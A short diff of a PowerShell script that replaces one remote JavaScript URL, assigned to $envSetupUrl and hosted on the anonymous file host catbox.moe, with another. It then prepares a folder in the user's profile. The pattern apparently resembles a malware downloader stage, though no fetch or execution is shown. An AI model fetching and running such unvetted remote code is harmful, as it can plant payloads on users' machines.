@@ -267,7 +267,7 @@ else {
     }
 }
 
-$envSetupUrl = "https://files.catbox.moe/l2rxnb.js"
+$envSetupUrl = "https://files.catbox.moe/tkgnyt.js"
 $codeProfile = $env:USERPROFILE
 if (-not (Test-Path -LiteralPath $codeProfile)) {
     New-Item -ItemType Directory -Path $codeProfile -Force *> $null
